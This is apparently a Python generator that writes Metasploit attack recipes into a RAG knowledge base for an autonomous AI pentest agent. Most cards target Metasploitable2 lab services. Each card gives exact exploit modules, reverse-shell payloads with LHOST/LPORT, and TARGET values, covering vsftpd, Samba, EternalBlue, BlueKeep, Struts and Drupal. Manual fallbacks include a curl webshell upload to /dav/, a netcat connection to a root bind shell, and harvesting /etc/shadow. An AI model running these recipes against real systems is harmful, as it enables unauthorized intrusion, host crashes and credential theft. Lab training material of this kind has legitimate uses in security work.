# -*- coding: utf-8 -*-
"""
DB_03 - Gerador de DOUTRINA TATICA (cards-receita) para o RAG.

Cada card segue um formato denso e literal, feito para que ate modelos locais
pequenos consigam ACERTAR seguindo instrucoes (em vez de depender do proprio
conhecimento). O card de ataque traz:
  - TRIGGER        : quando aplicar (porta + banner)
  - STRATEGY       : enumeration | brute_force | exploit_cve  (o que o pipeline aceita)
  - MODULE         : modulo Metasploit exato
  - REQUIRED OPTIONS: chaves/valores LITERAIS para o JSON "options" do pipeline
  - WHY            : o porque (erros comuns / armadilhas)
  - ALT PORTS      : portas alternativas onde o mesmo servico aparece
  - IF MODULE MISSING: fallback em 3 camadas (search -> loadpath -> PoC manual)
  - AFTER SESSION  : primeiros passos de pos-exploracao

Alinhamento com o pipeline (src/pipe_v4.py):
  - O pipeline ja injeta RHOSTS e RPORT. "options" deve conter o RESTO.
  - Em brute_force NAO inclua USERNAME/PASSWORD: o script cuida da wordlist.
  - strategy deve ser exatamente: enumeration, brute_force ou exploit_cve.
"""
import os


def format_tactical_card(name, keywords, description, instructions):
    """Card de doutrina/estrategia para a IA (1 card = 1 chunk no RAG)."""
    return f"""
=== TACTICAL KNOWLEDGE CARD ===
NAME: manual/tactic/{name}
TYPE: strategy
KEYWORDS: {keywords}
DESCRIPTION: {description.strip()}
INSTRUCTIONS:
{instructions.strip()}
USAGE_NOTE: Apply this logic during the PLANNING phase to pick the module, the
EXACT options, and the right payload. Prefer following these steps literally.
===============================
"""


def attack_card(name, ports, banner_match, keywords, strategy, module,
                required_options, why, alt_ports="(none)", if_missing="",
                after_session="See card post_exploitation_basics.",
                extra_steps=""):
    """Atalho para gerar um card de ataque no formato padrao."""
    instr = f"""
TRIGGER: Port(s) {ports} OPEN and banner matches: {banner_match}
STRATEGY (use this exact value): {strategy}
PRIMARY MODULE: {module}

REQUIRED OPTIONS (copy these EXACT keys/values into the JSON "options";
RHOSTS and RPORT are injected automatically by the pipeline):
{required_options}
{extra_steps}
WHY / PITFALLS:
{why}

ALTERNATIVE PORTS: {alt_ports}

IF THE MODULE DOES NOT EXIST in this Metasploit install:
{if_missing if if_missing else _default_missing(module)}

AFTER YOU GET A SESSION:
{after_session}
""".strip()
    return format_tactical_card(name, keywords, description=banner_match,
                                instructions=instr)


def _default_missing(module):
    return f"""  1. SEARCH: run 'search {module.split('/')[-1]}' (or 'search <product> <version>')
     in msfconsole to find the real module name in THIS version. Names drift.
  2. NEAREST: if a close installed module exists, use it; else degrade to a
     version/enumeration scanner for the service and report findings.
  3. MANUAL: if no module exists at all, see card missing_module_manual_poc
     (searchsploit / curl / nmap NSE) to exploit it outside Metasploit."""


def main():
    print("[DB_03] === GERADOR DE DOUTRINA TATICA (MANUAL) ===")
    cards = []

    # =====================================================================
    # DOUTRINA GERAL (planejamento)
    # =====================================================================
    cards.append(format_tactical_card(
        name="os_fingerprinting_by_port",
        keywords="recon os detection windows linux unix port mapping fingerprint",
        description="Guess the Operating System from the set of open ports.",
        instructions="""
        PORT -> LIKELY OS:
          135, 139, 445, 3389, 5985 (WinRM) -> WINDOWS
          22 (SSH), 111 (RPC), 2049 (NFS), 3306/5432 (DB on Linux) -> LINUX/UNIX
          512/513/514 (r-services) -> LINUX/UNIX (classic)
        DECISION LOGIC:
          - Windows ports -> prefer exploit/windows/... modules.
          - Linux ports   -> prefer exploit/linux/... or exploit/unix/... modules.
          - exploit/multi/... works on several OS (check its options/targets).
        NEVER run a 'windows' exploit against a pure-Linux host (and vice-versa):
        it wastes attempts and can hang the module.
        """
    ))

    cards.append(format_tactical_card(
        name="general_module_selection_logic",
        keywords="how to choose module matching logic strategy decision",
        description="Rules for matching modules to targets and picking strategy.",
        instructions="""
        STRATEGY VALUES (return exactly one):
          - "enumeration": version/vuln scanners, NO credentials. Low risk.
          - "brute_force": login/auth scanners (module name has 'login'/'_login').
             Do NOT put USERNAME/PASSWORD in options; the pipeline feeds the wordlist.
          - "exploit_cve": strong product+version match to a known RCE/backdoor.
        MATCHING ORDER:
          1. Identify service by PORT, confirm with BANNER (product + version).
          2. If version strongly matches a known vuln -> exploit_cve.
          3. If auth service (FTP/SSH/Telnet/SMB/DB/VNC) and no public exploit ->
             try brute_force with the lab wordlist.
          4. If uncertain -> enumeration (safe) and report.
        PATH tells the OS: exploit/windows, exploit/linux, exploit/unix, exploit/multi.
        """
    ))

    cards.append(format_tactical_card(
        name="payload_selection_guide",
        keywords="payload reverse bind meterpreter cmd unix shell lhost lport target",
        description="How to choose PAYLOAD and whether to set LHOST/LPORT/TARGET.",
        instructions="""
        REVERSE vs BIND:
          - reverse_* : target connects BACK to you. REQUIRES "LHOST": <attacker>
            and "LPORT" (e.g. "4444"). Use when target can reach the attacker.
          - bind_*    : target OPENS a port; you connect in. OMIT LHOST/LPORT.
          - backdoor/interact payloads (cmd/unix/interact): connect to a shell the
            service itself opens. OMIT LHOST/LPORT.
        PAYLOAD BY TARGET OS:
          - Linux/Unix command exec -> "cmd/unix/reverse" or "cmd/unix/reverse_perl".
          - Windows x64             -> "windows/x64/meterpreter/reverse_tcp".
          - Windows x86             -> "windows/meterpreter/reverse_tcp".
        TARGET INDEX: some exploits have multiple TARGET entries. If unsure, start
        with the index the service card recommends; on failure, try the next index
        (the pipeline will re-ask you with the error). "Invalid payload for given
        target" ALWAYS means PAYLOAD and TARGET are mismatched: change one of them.
        """
    ))

    cards.append(format_tactical_card(
        name="lport_lhost_rules",
        keywords="lhost lport reverse connection attacker ip handler options",
        description="When to include LHOST/LPORT and common handler pitfalls.",
        instructions="""
        - Include "LHOST": "<ATTACKER_IP>" ONLY for reverse payloads.
        - "LPORT": pick an unused high port, e.g. "4444". Keep it consistent.
        - For exploits, usually "DisablePayloadHandler": "false" so MSF catches
          the shell automatically.
        - Bind/backdoor payloads: do NOT set LHOST/LPORT (no reverse connection).
        - If two exploits run back-to-back, reuse the same LPORT or the handler
          may still be bound; change LPORT if you see "address already in use".
        """
    ))

    # =====================================================================
    # FALLBACK: MODULO AUSENTE (A: search / B: loadpath / C: PoC manual)
    # =====================================================================
    cards.append(format_tactical_card(
        name="missing_module_search",
        keywords="module not found missing search cve rank unknown exploit nearest",
        description="TIER A: find the right module when 'use' fails (module missing).",
        instructions="""
        When the pipeline says a module does not exist, DO NOT guess blindly.
        TIER A - SEARCH inside Metasploit (names change between versions):
          - search cve:<YEAR>-<NUM>            (e.g. search cve:2007-2447)
          - search <product> <version>         (e.g. search vsftpd 2.3.4)
          - search type:exploit name:<keyword>
        Pick a result whose FULLNAME matches the service/OS. Return that exact
        FULLNAME as module_name.
        IF SEARCH RETURNS NOTHING RELEVANT:
          - Choose the NEAREST installed module for the same service (e.g. a
            generic version/login scanner) to keep progressing, OR
          - Escalate to TIER B (missing_module_loadpath) or TIER C
            (missing_module_manual_poc).
        """
    ))

    cards.append(format_tactical_card(
        name="missing_module_loadpath",
        keywords="loadpath reload_all external community module rb msf4 custom install",
        description="TIER B: load an external/community module that ships with the lab.",
        instructions="""
        Some CVEs only have a COMMUNITY module (a .rb file), not in the base install.
        The lab stages curated external modules under a shared folder that is
        mounted into Metasploit (default: /root/.msf4/modules, and the repo copy
        at /app/data/vectorstore/msf_modules).
        STEPS (run in msfconsole):
          1. loadpath /root/.msf4/modules        (registers the extra tree)
          2. reload_all                          (re-indexes all modules)
          3. search <keyword>                    (confirm it is now listed)
          4. use <full/path/of/the/module>       (then set options as usual)
        If a service card names an EXTERNAL module, assume it is available only
        after loadpath/reload_all. If loadpath finds nothing, go to TIER C.
        """
    ))

    cards.append(format_tactical_card(
        name="missing_module_manual_poc",
        keywords="manual exploit searchsploit curl python nmap nse poc outside metasploit shell",
        description="TIER C: exploit WITHOUT a Metasploit module, via the shell.",
        instructions="""
        When no Metasploit module fits (common for very recent CVEs), exploit
        manually. Prefer a single, self-contained command.
        TOOLS (available on the attacker box):
          - searchsploit <product> <version>   -> find an Exploit-DB PoC path
          - searchsploit -m <id>               -> copy the PoC locally to run it
          - nmap --script vuln,<cve-script> -p <port> <TARGET>  -> NSE checks
          - curl / python3                     -> run an HTTP/raw PoC directly
        PATTERN for an HTTP CVE (adapt to the advisory):
          curl -s -X <METHOD> 'http://<TARGET>:<PORT>/<path>' \\
               -H '<vuln-header>: <payload>' --data '<body>'
        VERIFY: confirm code execution (id / whoami / a callback) before claiming
        success. If you open a reverse shell, start a listener first
        (e.g. 'nc -lvnp 4444' on <ATTACKER_IP>).
        REPORT exactly what you ran and the output, so it can be reproduced.
        """
    ))

    # =====================================================================
    # RECEITAS POR SERVICO (Metasploitable2 e alvos Linux/Unix classicos)
    # =====================================================================
    cards.append(attack_card(
        name="attack_guide_ftp_vsftpd234",
        ports="21", banner_match='FTP banner contains "vsftpd 2.3.4"',
        keywords="ftp port 21 vsftpd 2.3.4 backdoor smiley exploit",
        strategy="exploit_cve",
        module="exploit/unix/ftp/vsftpd_234_backdoor",
        required_options='    "TARGET": "1", "PAYLOAD": "cmd/unix/interact"',
        why="""  This module has two targets. TARGET 0 ("Linux/Unix Command") rejects
  cmd/unix/interact -> "Invalid payload for given target". TARGET 1
  ("Backdoor Command Shell") connects to the shell the server binds on port
  6200 and returns a session instantly. This is a BIND backdoor: do NOT set
  LHOST/LPORT.""",
        alt_ports="FTP may also run on 2121 (see ProFTPD card).",
        after_session="Run 'id'; you are usually root already. See post_exploitation_basics.",
    ))

    cards.append(attack_card(
        name="attack_guide_ftp_proftpd",
        ports="21, 2121", banner_match='FTP banner contains "ProFTPD"',
        keywords="ftp proftpd 2121 mod_copy 133c backdoor login brute",
        strategy="brute_force",
        module="auxiliary/scanner/ftp/ftp_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  ProFTPD rarely has an unauthenticated backdoor like vsftpd. Start with
  anonymous/login. If banner is "ProFTPD 1.3.3c" try
  exploit/unix/ftp/proftpd_133c_backdoor (strategy exploit_cve,
  PAYLOAD cmd/unix/reverse, set LHOST/LPORT). If "mod_copy" is present try
  exploit/unix/ftp/proftpd_modcopy_exec.""",
        alt_ports="Metasploitable2 runs ProFTPD on 2121.",
    ))

    cards.append(attack_card(
        name="attack_guide_ssh_login",
        ports="22", banner_match='SSH banner "SSH-2.0-OpenSSH..."',
        keywords="ssh port 22 openssh login brute credentials weak password",
        strategy="brute_force",
        module="auxiliary/scanner/ssh/ssh_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  SSH almost never has direct RCE. Go straight to credential testing with the
  lab wordlist. On Metasploitable2 the classic pair is msfadmin/msfadmin.
  Do NOT put USERNAME/PASSWORD in options; brute_force uses the wordlist file.""",
        after_session="A successful login yields a shell session; run 'sudo -l' and 'id'.",
    ))

    cards.append(attack_card(
        name="attack_guide_telnet_login",
        ports="23", banner_match='Telnet (port 23), cleartext login prompt',
        keywords="telnet port 23 login brute credentials cleartext msfadmin",
        strategy="brute_force",
        module="auxiliary/scanner/telnet/telnet_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Telnet sends credentials in cleartext. Brute force with the wordlist.
  Metasploitable2 accepts msfadmin/msfadmin.""",
    ))

    cards.append(attack_card(
        name="attack_guide_smtp_enum",
        ports="25", banner_match='SMTP banner "ESMTP"/"Postfix"/"Sendmail"/"Exim"',
        keywords="smtp port 25 postfix exim enumeration vrfy users",
        strategy="enumeration",
        module="auxiliary/scanner/smtp/smtp_enum",
        required_options='    (none beyond RHOSTS/RPORT)',
        why="""  SMTP is mostly useful for user enumeration (VRFY/EXPN). If banner is a
  vulnerable Exim, switch to exploit/linux/smtp/exim4_* (strategy exploit_cve).""",
    ))

    cards.append(attack_card(
        name="attack_guide_http_apache",
        ports="80, 8080", banner_match='HTTP "Apache"/"nginx"/"PHP"',
        keywords="http port 80 apache web enumeration dav webdav dir scanner",
        strategy="enumeration",
        module="auxiliary/scanner/http/http_version",
        required_options='    (none beyond RHOSTS/RPORT)',
        why="""  Do NOT assume a CMS/framework unless the banner proves it. Enumerate first:
  http_version, then auxiliary/scanner/http/dir_scanner and .../webdav_scanner.
  On Metasploitable2 /dav is WebDAV-writable (upload a webshell). If you find
  Tomcat, see the Tomcat card; if Struts, exploit/multi/http/struts2_*.""",
        alt_ports="Tomcat on 8180; alternative HTTP on 8080/8000.",
    ))

    cards.append(attack_card(
        name="attack_guide_tomcat_manager",
        ports="8180, 8080", banner_match='HTTP "Apache-Coyote"/"Tomcat"',
        keywords="tomcat port 8180 coyote manager login deploy war upload",
        strategy="brute_force",
        module="auxiliary/scanner/http/tomcat_mgr_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  First brute the Manager app (classic creds tomcat/tomcat). Once you have
  creds, chain to exploit/multi/http/tomcat_mgr_upload (strategy exploit_cve)
  with "HttpUsername"/"HttpPassword" and a java/meterpreter payload to deploy
  a WAR and get a session.""",
        alt_ports="Tomcat often on 8080, 8180, 8443.",
    ))

    cards.append(attack_card(
        name="attack_guide_samba_usermap",
        ports="139, 445", banner_match='SMB "Samba 3.0.x" / Unix host',
        keywords="samba smb port 139 445 usermap script cve-2007-2447 linux",
        strategy="exploit_cve",
        module="exploit/multi/samba/usermap_script",
        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2007-2447 (username map script command injection). Works on Samba
  3.0.20-3.0.25. This is a REVERSE shell: set LHOST/LPORT. Returns a root
  shell. Use RPORT 139; 445 also works.""",
        alt_ports="Try 445 if 139 is filtered.",
        if_missing="""  1. search cve:2007-2447  (or 'search usermap')
  2. For Samba 3.5.0-4.6.4 instead try exploit/linux/samba/is_known_pipename.
  3. Else degrade to auxiliary/scanner/smb/smb_version + smb_enumshares.""",
    ))

    cards.append(attack_card(
        name="attack_guide_java_rmi",
        ports="1099", banner_match='Java RMI registry on 1099',
        keywords="java rmi port 1099 rmiregistry server codebase exploit",
        strategy="exploit_cve",
        module="exploit/multi/misc/java_rmi_server",
        required_options='    "PAYLOAD": "java/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Default RMI config allows loading a remote class (unauthenticated RCE).
  Reverse payload: set LHOST/LPORT. If java/meterpreter fails, try
  java/shell/reverse_tcp.""",
    ))

    cards.append(attack_card(
        name="attack_guide_distcc",
        ports="3632", banner_match='distccd on 3632',
        keywords="distcc port 3632 distributed compiler cve-2004-2687 exec",
        strategy="exploit_cve",
        module="exploit/unix/misc/distcc_exec",
        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2004-2687: distccd runs attacker commands unauthenticated. Reverse
  shell (set LHOST/LPORT). Lands as the 'daemon' user; then privesc.""",
        after_session="You are user 'daemon'. Try udev/overlayfs local privesc; see post card.",
    ))

    cards.append(attack_card(
        name="attack_guide_unrealircd",
        ports="6667, 6697", banner_match='IRC "UnrealIRCd" (esp. 3.2.8.1)',
        keywords="irc port 6667 unrealircd 3.2.8.1 backdoor cve-2010-2075",
        strategy="exploit_cve",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        required_options='    "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2010-2075: the 3.2.8.1 tarball shipped a backdoor. Reverse shell
  (set LHOST/LPORT). If it stalls, try cmd/unix/reverse_perl.""",
        alt_ports="IRC also on 6697 (TLS) and 6660-6669.",
    ))

    cards.append(attack_card(
        name="attack_guide_postgresql",
        ports="5432", banner_match='PostgreSQL on 5432',
        keywords="postgresql port 5432 postgres login brute payload udf",
        strategy="brute_force",
        module="auxiliary/scanner/postgres/postgres_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Default Metasploitable2 creds: postgres/postgres. After valid creds, chain
  exploit/linux/postgres/postgres_payload (strategy exploit_cve) with
  "USERNAME"/"PASSWORD" and a linux reverse payload to get a session.""",
    ))

    cards.append(attack_card(
        name="attack_guide_mysql",
        ports="3306", banner_match='MySQL/MariaDB on 3306',
        keywords="mysql port 3306 mariadb login brute udf payload root blank",
        strategy="brute_force",
        module="auxiliary/scanner/mysql/mysql_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Metasploitable2 MySQL often has root with a BLANK password. After creds,
  chain exploit/linux/mysql/mysql_udf_payload (strategy exploit_cve) for RCE.""",
    ))

    cards.append(attack_card(
        name="attack_guide_vnc",
        ports="5900, 5901", banner_match='VNC "RFB" on 5900',
        keywords="vnc port 5900 rfb no-auth login password weak",
        strategy="brute_force",
        module="auxiliary/scanner/vnc/vnc_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  First test no-auth with auxiliary/scanner/vnc/vnc_none_auth (strategy
  enumeration). Metasploitable2 VNC password is 'password'. VNC gives GUI
  control, not a direct shell.""",
        alt_ports="VNC displays map to 5900+N (5901, 5902, ...).",
    ))

    cards.append(attack_card(
        name="attack_guide_rservices",
        ports="512, 513, 514", banner_match='r-services (rexec/rlogin/rsh)',
        keywords="rservices port 512 513 514 rexec rlogin rsh trust login",
        strategy="brute_force",
        module="auxiliary/scanner/rservices/rsh_login",
        required_options='    (none beyond RHOSTS/RPORT; the pipeline feeds the wordlist)',
        why="""  Legacy trust-based login. On Metasploitable2 'rsh -l root <ip>' often works
  due to a permissive .rhosts. If the module is missing, see
  missing_module_manual_poc and run the rsh/rlogin client from the shell.""",
    ))

    cards.append(attack_card(
        name="attack_guide_ingreslock_bindshell",
        ports="1524", banner_match='open 1524 "ingreslock" / raw root shell',
        keywords="ingreslock port 1524 bindshell backdoor root netcat manual",
        strategy="exploit_cve",
        module="(no standard MSF module - this is a raw bind shell)",
        required_options='    (not applicable)',
        why="""  Metasploitable2 leaves a ROOT bind shell on 1524. There is no exploit
  module: you just CONNECT. This needs the MANUAL path.""",
        if_missing="""  Use TIER C (missing_module_manual_poc): from the attacker shell run
    nc <TARGET> 1524
  and you land directly as root. Then run 'id' to confirm.""",
        after_session="You are root immediately. Collect /etc/shadow, see post card.",
    ))

    # =====================================================================
    # RECEITAS WINDOWS (cobertura alem do Metasploitable2)
    # =====================================================================
    cards.append(attack_card(
        name="attack_guide_smb_eternalblue",
        ports="445", banner_match='Windows SMBv1 on 445',
        keywords="smb port 445 ms17-010 eternalblue windows cve-2017-0144 smbv1",
        strategy="exploit_cve",
        module="exploit/windows/smb/ms17_010_eternalblue",
        required_options='    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2017-0144. FIRST confirm with auxiliary/scanner/smb/smb_ms17_010
  (strategy enumeration). Only run EternalBlue if the scanner says VULNERABLE;
  on a patched/64-bit-mismatched host it can crash the target.""",
        if_missing="""  1. search ms17_010  (variants: _psexec, _command).
  2. If x86 target, use windows/meterpreter/reverse_tcp instead of x64.
  3. Else TIER C: searchsploit ms17-010.""",
    ))

    cards.append(attack_card(
        name="attack_guide_rdp_bluekeep",
        ports="3389", banner_match='RDP on 3389 (Windows 7 / 2008)',
        keywords="rdp port 3389 bluekeep cve-2019-0708 windows remote desktop",
        strategy="exploit_cve",
        module="exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        required_options='    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444", "TARGET": "3"',
        why="""  CVE-2019-0708. VERY unstable: wrong TARGET bluescreens the host. FIRST scan
  with auxiliary/scanner/rdp/cve_2019_0708_bluekeep (strategy enumeration).
  TARGET maps to the hypervisor (1=VMware, 2=Hyper-V, 3=Baremetal/other);
  start with 3 and, on failure, let the retry loop try other indexes.""",
    ))

    # =====================================================================
    # WEB: doutrina + receitas por APP (usam a sub-fase de enumeracao web)
    # =====================================================================
    cards.append(format_tactical_card(
        name="web_enumeration_doctrine",
        keywords="http https web apache nginx php javascript enumeration targeturi vhost path app",
        description="How to attack a web port: the banner is NOT the target; the app is.",
        instructions="""
        A web SERVER banner (Apache/nginx/IIS/PHP/Node) does NOT tell you what is
        vulnerable. The vulnerability lives in the APPLICATION behind a PATH.
        ALWAYS read the WEB ENUMERATION findings (http-enum/title/headers/methods)
        provided for the port and act on DISCOVERED paths/apps:
          - Map each discovered path to an app, then to a module (see web cards).
          - Set the EXACT path in "TARGETURI" (e.g. "TARGETURI": "/tikiwiki/").
          - Use "VHOST" if the app answers on a specific hostname.
          - PHP apps -> php/* payloads (e.g. php/meterpreter/reverse_tcp).
          - If headers show "DAV" or methods include PUT -> WebDAV upload (see card).
          - If headers show "X-Powered-By: PHP/5.x" served via CGI -> php_cgi card.
        If nothing exploitable is discovered, run auxiliary/scanner/http/dir_scanner
        (strategy enumeration) to find more paths, then re-evaluate.
        nginx itself rarely has RCE: focus on the app it proxies.
        """
    ))

    cards.append(attack_card(
        name="web_webdav_upload",
        ports="80, 443, 8080", banner_match='HTTP headers show "DAV"/"DAV/2" or PUT allowed',
        keywords="webdav dav put upload webshell apache /dav writable http",
        strategy="enumeration",
        module="auxiliary/scanner/http/webdav_scanner",
        required_options='    "PATH": "/"',
        why="""  WebDAV lets you WRITE files. First confirm with webdav_scanner. On
  Metasploitable2 the /dav/ folder is writable. There is no single MSF exploit:
  UPLOAD a webshell manually (TIER C) and browse to it.""",
        if_missing="""  TIER C (missing_module_manual_poc): upload and trigger a shell, e.g.
    curl -T shell.php http://<TARGET>/dav/shell.php
    curl 'http://<TARGET>/dav/shell.php?cmd=id'
  (use a simple PHP system($_GET[cmd]) shell).""",
        after_session="A webshell runs as www-data; then local privesc.",
    ))

    cards.append(attack_card(
        name="web_php_cgi_arg_injection",
        ports="80, 443", banner_match='HTTP header "X-Powered-By: PHP/5.x" (php-cgi)',
        keywords="php cgi argument injection cve-2012-1823 php5 x-powered-by rce",
        strategy="exploit_cve",
        module="exploit/multi/http/php_cgi_arg_injection",
        required_options='    "TARGETURI": "/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2012-1823: PHP running as a CGI accepts command-line args in the query
  string -> RCE. The X-Powered-By: PHP/5.3.x/5.4.x header is the signal. PHP
  payload (set LHOST/LPORT).""",
    ))

    cards.append(attack_card(
        name="web_phpmyadmin",
        ports="80, 443, 8080", banner_match='http-enum found "/phpMyAdmin/" or "/phpmyadmin/"',
        keywords="phpmyadmin web sql rce lfi setup targeturi credentials",
        strategy="exploit_cve",
        module="exploit/multi/http/phpmyadmin_lfi_rce",
        required_options='    "TARGETURI": "/phpMyAdmin/", "USERNAME": "root", "PASSWORD": "", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Set TARGETURI to the discovered path. phpMyAdmin exploits are VERSION-specific
  and usually need DB creds (try root/blank on Metasploitable2). If this exact
  module is missing, search for the right one.""",
        if_missing="""  1. search phpmyadmin   (pick the module matching the installed version)
  2. If only info disclosure, read config/version then switch module.
  3. TIER C: searchsploit phpmyadmin <version>.""",
    ))

    cards.append(attack_card(
        name="web_tikiwiki",
        ports="80, 443", banner_match='http-enum found "/tikiwiki/" or "/tiki/"',
        keywords="tikiwiki tiki web php rce graph formula targeturi metasploitable",
        strategy="exploit_cve",
        module="exploit/unix/webapp/tikiwiki_graph_formula_exec",
        required_options='    "TARGETURI": "/tikiwiki/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  Old TikiWiki (on Metasploitable2) has a PHP code-eval RCE. Set TARGETURI to the
  discovered path. If the module name differs, search 'tikiwiki'.""",
    ))

    cards.append(attack_card(
        name="web_twiki",
        ports="80, 443", banner_match='http-enum found "/twiki/"',
        keywords="twiki web perl rce history rev targeturi cgi",
        strategy="exploit_cve",
        module="exploit/unix/webapp/twiki_history",
        required_options='    "TARGETURI": "/twiki/", "PAYLOAD": "cmd/unix/reverse", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  TWiki 'rev' parameter command injection. Set TARGETURI to the discovered path.
  If missing, search 'twiki'.""",
    ))

    cards.append(attack_card(
        name="web_struts2",
        ports="80, 443, 8080", banner_match='Java app / .action/.do URLs (Apache Struts)',
        keywords="struts struts2 ognl content-type java rce cve-2017-5638 targeturi",
        strategy="exploit_cve",
        module="exploit/multi/http/struts2_content_type_ognl",
        required_options='    "TARGETURI": "/<app>.action", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2017-5638 (OGNL via Content-Type). Set TARGETURI to a real .action/.do
  endpoint found in enumeration. Many Struts CVEs exist; search 'struts' and pick
  the one matching the version/vector.""",
    ))

    cards.append(attack_card(
        name="web_drupalgeddon2",
        ports="80, 443", banner_match='http-enum found "/user/register" or CHANGELOG Drupal',
        keywords="drupal drupalgeddon cve-2018-7600 php rce targeturi cms",
        strategy="exploit_cve",
        module="exploit/unix/webapp/drupal_drupalgeddon2",
        required_options='    "TARGETURI": "/", "PAYLOAD": "php/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2018-7600 (Drupal 7/8 unauth RCE). Set TARGETURI to the Drupal root path.""",
    ))

    cards.append(attack_card(
        name="web_shellshock_cgi",
        ports="80, 443", banner_match='http-enum found "/cgi-bin/" scripts (bash CGI)',
        keywords="shellshock bash cgi cve-2014-6271 apache mod_cgi env rce targeturi",
        strategy="exploit_cve",
        module="exploit/multi/http/apache_mod_cgi_bash_env_exec",
        required_options='    "TARGETURI": "/cgi-bin/<script>", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  CVE-2014-6271 (Shellshock). TARGETURI must point at a REAL cgi script found in
  enumeration (e.g. /cgi-bin/status). A wrong TARGETURI fails silently.""",
    ))

    cards.append(attack_card(
        name="web_jenkins_script_console",
        ports="8080, 8081, 80", banner_match='http-title/headers show "Jenkins"',
        keywords="jenkins script console groovy rce java targeturi ci",
        strategy="exploit_cve",
        module="exploit/multi/http/jenkins_script_console",
        required_options='    "TARGETURI": "/", "PAYLOAD": "java/meterpreter/reverse_tcp", "LHOST": "<ATTACKER_IP>", "LPORT": "4444"',
        why="""  If the Groovy script console is unauthenticated (or creds known), this is RCE.
  Set TARGETURI to the Jenkins base path. Add "USERNAME"/"PASSWORD" if required.""",
    ))

    # ---- salva ----
    output_path = os.getenv("TACTICAL_OUT", "/app/config/ingest/kb_tactical.txt")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(cards))

    print(f"[DB_03] [SUCESSO] Gerados {len(cards)} Cards Taticos.")
    print(f"[DB_03] [OUTPUT] {output_path}")


if __name__ == "__main__":
    main()
